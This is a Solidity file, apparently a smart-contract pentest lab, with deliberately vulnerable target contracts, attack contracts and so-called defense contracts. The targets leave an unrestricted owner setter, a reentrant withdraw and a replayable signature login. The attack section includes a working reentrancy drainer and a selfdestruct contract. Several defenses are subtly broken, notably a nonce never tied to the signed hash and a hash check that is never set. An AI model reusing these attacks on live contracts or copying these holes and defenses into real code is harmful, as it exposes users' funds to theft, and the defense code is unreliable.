// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/* ================== PENTEST TYPES ================== */

// 1️⃣ Blackbox Pentest Target
contract PublicTarget {
    bool public triggered;

    function test() external {
        triggered = true;
    }

    fallback() external payable {
        triggered = true;
    }
}

// 2️⃣ Whitebox Pentest Target
contract RoleBypassable {
    address public owner;

    function setOwner(address newOwner) external {
        owner = newOwner;
    }
}

// 3️⃣ Fuzz Pentest Target
contract SelectorFuzz {
    mapping(bytes4 => uint256) public calls;

    fallback() external {
        calls[msg.sig]++;
    }
}

// 4️⃣ Reentrancy Target
contract ReentrancyVictim {
    mapping(address => uint256) public balance;

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(balance[msg.sender] > 0, "Empty");
        (bool ok, ) = msg.sender.call{value: balance[msg.sender]}("");
        require(ok);
        balance[msg.sender] = 0;
    }
}

// 5️⃣ zkProof/Signature Pentest
contract SignatureRelayTarget {
    mapping(bytes32 => bool) public used;

    function login(bytes32 h, bytes calldata sig) external {
        require(!used[h], "Already used");
        address user = recover(h, sig);
        require(user != address(0), "Invalid");
        used[h] = true;
    }

    function recover(bytes32 h, bytes memory sig) public pure returns (address) {
        (bytes32 r, bytes32 s, uint8 v) = abi.decode(sig, (bytes32, bytes32, uint8));
        return ecrecover(h, v, r, s);
    }
}

/* ================== ATTACK MODULES ================== */

// 1️⃣ Calldata Injector
contract Injector {
    function inject(address target, bytes calldata data) external {
        target.call(data);
    }
}

// 2️⃣ Reentrancy Bot
contract ReentryBot {
    address public target;

    receive() external payable {
        if (gasleft() > 10000) {
            (bool ok, ) = target.call(abi.encodeWithSignature("withdraw()"));
            require(ok);
        }
    }

    function attack(address t) external payable {
        target = t;
        ReentrancyVictim(t).deposit{value: msg.value}();
        ReentrancyVictim(t).withdraw();
    }
}

// 3️⃣ Signature Drifter
contract SigDrift {
    function relay(address t, bytes32 h, bytes calldata sig) external {
        t.call(abi.encodeWithSignature("login(bytes32,bytes)", h, sig));
    }
}

// 4️⃣ Logic Hijacker
contract MaliciousLogic {
    function pwn() external {
        selfdestruct(payable(msg.sender));
    }
}

// 5️⃣ Collision Injector
contract CollideStorage {
    uint256 public slot1; // e.g. overwritten by proxy slot

    function overwrite(uint256 x) external {
        slot1 = x;
    }
}

/* ================== DEFENSE MODULES ================== */

// 🛡️ 1 Selector + Length Check
contract CalldataGuard {
    fallback() external {
        require(msg.data.length >= 4, "Short call");
        require(msg.sig != 0xffffffff, "Blocked");
    }
}

// 🛡️ 2 Reentrancy Lock
contract ReentrySafe {
    bool internal locked;

    modifier noReentry() {
        require(!locked, "Reentry");
        locked = true;
        _;
        locked = false;
    }

    function withdraw() external noReentry {
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}

// 🛡️ 3 Sig Nonce + Target Lock
contract SecureSigLogin {
    mapping(address => uint256) public nonce;

    function login(bytes32 hash, bytes calldata sig) external {
        require(recover(hash, sig) == msg.sender, "Invalid");
        nonce[msg.sender]++;
    }

    function recover(bytes32 h, bytes memory sig) public pure returns (address) {
        (bytes32 r, bytes32 s, uint8 v) = abi.decode(sig, (bytes32, bytes32, uint8));
        return ecrecover(h, v, r, s);
    }
}

// 🛡️ 4 Proxy Upgrade Lock
contract UpgradeVerifier {
    bytes32 public logicHash;

    function verify(address logic) public view returns (bool) {
        return keccak256(abi.encodePacked(logic.code)) == logicHash;
    }
}

// 🛡️ 5 Slot Layout Guard
contract SlotLayoutGuard {
    mapping(bytes32 => bytes32) internal store;

    function write(bytes32 slot, bytes32 val) external {
        require(slot != keccak256("admin.slot"), "Protected");
        store[slot] = val;
    }
}
